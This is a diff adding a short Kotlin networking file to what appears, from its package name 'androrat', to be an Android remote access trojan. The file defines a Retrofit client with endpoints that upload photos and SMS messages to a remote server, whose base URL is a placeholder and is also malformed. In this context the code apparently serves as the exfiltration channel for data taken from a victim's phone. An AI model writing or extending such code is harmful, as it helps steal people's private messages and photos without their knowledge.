@@ -1,0 +1,40 @@
+package com.ierusalem.androrat.core.data.networking
+
+import okhttp3.MultipartBody
+import okhttp3.RequestBody
+import okhttp3.ResponseBody
+import retrofit2.Response
+import retrofit2.Retrofit
+import retrofit2.converter.gson.GsonConverterFactory
+import retrofit2.http.Multipart
+import retrofit2.http.POST
+import retrofit2.http.Part
+
+interface ApiService {
+    @Multipart
+    @POST("upload")
+    suspend fun uploadPhotos(
+        @Part file: MultipartBody.Part
+    ): Response<ResponseBody>
+
+    @Multipart
+    @POST("sms")
+    suspend fun uploadSMS(
+        @Part("sms") sms: RequestBody
+    ): Response<ResponseBody>
+}
+
+object RetrofitInstance {
+    private const val BASE_URL = "http://127.0.0"
+
+    private val retrofit by lazy {
+        Retrofit.Builder()
+            .baseUrl(BASE_URL)
+            .addConverterFactory(GsonConverterFactory.create())
+            .build()
+    }
+
+    fun api(): ApiService {
+        return retrofit.create(ApiService::class.java)
+    }
+}
